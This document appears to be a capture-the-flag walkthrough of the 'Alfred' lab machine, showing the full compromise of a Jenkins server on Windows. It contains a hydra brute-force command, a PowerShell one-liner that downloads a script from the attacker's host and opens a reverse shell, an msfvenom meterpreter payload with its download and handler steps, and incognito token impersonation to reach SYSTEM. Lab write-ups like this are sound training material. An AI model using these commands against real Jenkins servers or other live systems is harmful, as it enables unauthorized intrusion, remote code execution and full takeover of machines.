> Alfred | Jenkins

# rustscan

sudo rustscan -a $IP --ulimit=5000 --batch-size=4500 -- -sC -sV -Pn -A -O | tee rustscan.log


```
80/tcp   open  http           syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ms-wbt-server? syn-ack ttl 127
8080/tcp open  http           syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

And let's work straight with Jenkins. We don't have any credentials . Let's try bruteforcing with some passwords.

## wordlists.txt

```
admin
default
jenkins
password
Admin
Default
Jenkins
Password
```

# hydra

hydra -L wordlists.txt -P wordlists.txt $IP -s 8080 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&form=%2F&Submit=Sign+in:loginError"

```
[8080][http-post-form] host: 10.10.48.97   login: admin   password: admin => This works
[8080][http-post-form] host: 10.10.48.97   login: Admin   password: admin
```

In `Projects` tab, under `Configure` we can execute commands. And let's put the payload here!!

`powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.107.21:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.107.21 -Port 1234`

Let's have a python server and listener setup. Now we have a shell after building the project!!

# user.txt

```
79007a09481963edf2e1321abd9ae2a0
```

# Switching shells

# Msfvenom Payload

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.107.21 LPORT=12345 -f exe -o shell.exe`

Let's transfer it to the machine using `Invoke-PowerShellTcp.ps1`

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.107.21:8000/shell.exe', 'shell.exe')"`

# Steps

1. (msfconsole) use exploit/multi/handler 
2. (msfconsole) set PAYLOAD windows/meterpreter/reverse_tcp 
3. (msfconsole) set LHOST 10.8.107.21 
4. (msfconsole) set LPORT 12345
5. (msfconsole) run
6. (powershell) Start-Process "shell-name.exe"

Now we have a meterpreter shell!!

# Privilege Escalation

Here they are using token impersonation attack.

whoami /all

```
Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled  => 🔒
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled  => 🔒
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

Let's load `incognito` module to exploit this vulnerability. `load incognito`

list_tokens -g

```
Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\WinDefend
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\NlaSvc
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\TermService
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
```

impersonate_token "BUILTIN\Administrators"

```
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

getuid => `NT AUTHORITY\SYSTEM`

We are NT authority but with impersonated token. So we are restricted to setermine what processes can do since windows allows users with primary access token to determine what the process can do. Let's migrate the process to services.exe which is safe for us.

Type `ps` and we have the pid of `services.exe`. Now in metasploit type `migrate PID`.

# root.txt

```
dff0f748678f280250f25a45b8046b4a
```